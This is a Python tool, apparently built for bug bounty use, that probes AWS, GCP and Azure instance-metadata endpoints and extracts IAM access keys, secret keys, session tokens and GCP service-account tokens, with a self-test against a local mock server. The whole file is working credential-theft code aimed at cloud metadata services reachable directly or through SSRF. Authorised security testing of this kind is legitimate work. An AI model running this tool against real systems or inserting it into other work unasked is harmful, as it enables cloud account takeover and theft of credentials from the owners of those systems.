#!/usr/bin/env python3
"""
CATEGORY: Cloud Reconnaissance
TECHNIQUES: SSRF detection, metadata enumeration, IAM credential extraction
CHAIN_CONTRIBUTIONS: Integrates multi-cloud metadata discovery, rate limiting, and structured reporting for bug bounty workflows.
"""

import argparse
import json
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urljoin

import requests

TOOL_NAME = "CloudMetaSSRF"
VERSION = "1.0.0"
TIMEOUT = 10
RATE_LIMIT = 0.5  # seconds


def rate_limited_request(method, url, **kwargs):
    """Perform an HTTP request respecting rate limiting and error handling."""
    try:
        response = requests.request(method, url, timeout=TIMEOUT, **kwargs)
        time.sleep(RATE_LIMIT)
        return response
    except requests.RequestException as e:
        time.sleep(RATE_LIMIT)
        return None


def test_aws(target):
    base = urljoin(target, "/latest/meta-data/")
    endpoints = {
        "instance-id": "instance-id",
        "region": "placement/region",
        "iam-role": "iam/security-credentials/",
    }
    data = {}
    findings = []
    for name, path in endpoints.items():
        url = urljoin(base, path)
        resp = rate_limited_request("GET", url)
        if resp and resp.status_code == 200:
            if name == "iam-role":
                role = resp.text.strip()
                if role:
                    findings.append(f"AWS IAM role discovered: {role}")
                    cred_url = urljoin(base, f"iam/security-credentials/{role}")
                    cred_resp = rate_limited_request("GET", cred_url)
                    if cred_resp and cred_resp.status_code == 200:
                        try:
                            creds = cred_resp.json()
                            data["aws"] = {
                                "role": role,
                                "access_key_id": creds.get("AccessKeyId"),
                                "secret_access_key": creds.get("SecretAccessKey"),
                                "token": creds.get("Token"),
                                "expiration": creds.get("Expiration"),
                            }
                            findings.append("AWS IAM credentials extracted")
                        except ValueError:
                            findings.append("AWS IAM credentials endpoint returned non-JSON")
                else:
                    findings.append("AWS IAM role endpoint reachable but empty")
            else:
                data.setdefault("aws", {})[name] = resp.text.strip()
                findings.append(f"AWS {name} discovered")
        else:
            continue
    return data, findings


def test_gcp(target):
    base = urljoin(target, "/computeMetadata/v1/")
    headers = {"Metadata-Flavor": "Google"}
    endpoints = {
        "instance-id": "instance/id",
        "zone": "instance/zone",
        "service-account": "instance/service-accounts/default/token",
    }
    data = {}
    findings = []
    for name, path in endpoints.items():
        url = urljoin(base, path)
        resp = rate_limited_request("GET", url, headers=headers)
        if resp and resp.status_code == 200:
            if name == "service-account":
                try:
                    token_info = resp.json()
                    data["gcp"] = {
                        "access_token": token_info.get("access_token"),
                        "expires_in": token_info.get("expires_in"),
                        "token_type": token_info.get("token_type"),
                    }
                    findings.append("GCP service account token extracted")
                except ValueError:
                    findings.append("GCP token endpoint returned non-JSON")
            else:
                data.setdefault("gcp", {})[name] = resp.text.strip()
                findings.append(f"GCP {name} discovered")
        else:
            continue
    return data, findings


def test_azure(target):
    # Azure requires query parameter api-version and header Metadata:true
    base = urljoin(target, "/metadata/instance")
    params = {"api-version": "2021-02-01"}
    headers = {"Metadata": "true"}
    resp = rate_limited_request("GET", base, headers=headers, params=params)
    findings = []
    data = {}
    if resp and resp.status_code == 200:
        try:
            meta = resp.json()
            data["azure"] = {
                "compute": meta.get("compute", {}),
                "network": meta.get("network", {}),
            }
            findings.append("Azure instance metadata retrieved")
        except ValueError:
            findings.append("Azure metadata endpoint returned non-JSON")
    return data, findings


def aggregate_results(target):
    overall = {
        "tool": TOOL_NAME,
        "version": VERSION,
        "target": target,
        "status": "error",
        "technologies": [],
        "findings": [],
        "results": {},
    }

    try:
        aws_data, aws_findings = test_aws(target)
        if aws_data:
            overall["technologies"].append("AWS")
            overall["results"].update(aws_data)
            overall["findings"].extend(aws_findings)

        gcp_data, gcp_findings = test_gcp(target)
        if gcp_data:
            overall["technologies"].append("GCP")
            overall["results"].update(gcp_data)
            overall["findings"].extend(gcp_findings)

        azure_data, azure_findings = test_azure(target)
        if azure_data:
            overall["technologies"].append("Azure")
            overall["results"].update(azure_data)
            overall["findings"].extend(azure_findings)

        if overall["technologies"]:
            overall["status"] = "success"
        else:
            overall["status"] = "no_metadata_exposed"
    except Exception as e:
        overall["status"] = "exception"
        overall["findings"].append(f"Exception occurred: {str(e)}")

    return overall


def run_self_test():
    """Spin up a mock metadata server and run the scanner against it."""
    class MockHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            # AWS mock
            if self.path.startswith("/latest/meta-data/iam/security-credentials/"):
                role = "mock-role"
                if self.path.rstrip("/") == "/latest/meta-data/iam/security-credentials/":
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(role.encode())
                else:
                    cred = {
                        "Code": "Success",
                        "LastUpdated": "2023-01-01T00:00:00Z",
                        "Type": "AWS-HMAC",
                        "AccessKeyId": "AKIAEXAMPLE",
                        "SecretAccessKey": "secretkeyexample",
                        "Token": "tokenexample",
                        "Expiration": "2023-01-02T00:00:00Z",
                    }
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(json.dumps(cred).encode())
                return

            if self.path.startswith("/latest/meta-data/"):
                mapping = {
                    "/latest/meta-data/instance-id": "i-0123456789abcdef0",
                    "/latest/meta-data/placement/region": "us-east-1",
                }
                resp = mapping.get(self.path, "")
                if resp:
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(resp.encode())
                    return

            # GCP mock
            if self.path.startswith("/computeMetadata/v1/instance/service-accounts/default/token"):
                self.send_response(200)
                self.send_header("Metadata-Flavor", "Google")
                self.end_headers()
                token = {
                    "access_token": "ya29.c.MockToken",
                    "expires_in": 3599,
                    "token_type": "Bearer"
                }
                self.wfile.write(json.dumps(token).encode())
                return
            if self.path.startswith("/computeMetadata/v1/instance/"):
                mapping = {
                    "/computeMetadata/v1/instance/id": "1234567890123456789",
                    "/computeMetadata/v1/instance/zone": "projects/123456789/zones/us-central1-a",
                }
                resp = mapping.get(self.path, "")
                if resp:
                    self.send_response(200)
                    self.send_header("Metadata-Flavor", "Google")
                    self.end_headers()
                    self.wfile.write(resp.encode())
                    return

            # Azure mock
            if self.path.startswith("/metadata/instance"):
                self.send_response(200)
                self.send_header("Metadata", "true")
                self.end_headers()
                meta = {
                    "compute": {"location": "eastus", "name": "mockvm"},
                    "network": {"interface": []}
                }
                self.wfile.write(json.dumps(meta).encode())
                return

            # Default 404
            self.send_response(404)
            self.end_headers()

        def log_message(self, format, *args):
            # Suppress logging
            return

    server = HTTPServer(("127.0.0.1", 0), MockHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    target = f"http://127.0.0.1:{port}"
    result = aggregate_results(target)
    server.shutdown()
    print(json.dumps(result, indent=2))
    return 0


def main():
    parser = argparse.ArgumentParser(description="Cloud metadata SSRF tester with IAM extraction")
    parser.add_argument("target", nargs="?", help="Base URL to test (e.g., http://169.254.169.254)")
    parser.add_argument("--self-test", action="store_true", help="Run internal self‑test")
    args = parser.parse_args()

    if args.self_test:
        sys.exit(run_self_test())

    if not args.target:
        parser.error("target URL is required unless --self-test is used")

    result = aggregate_results(args.target.rstrip("/"))
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()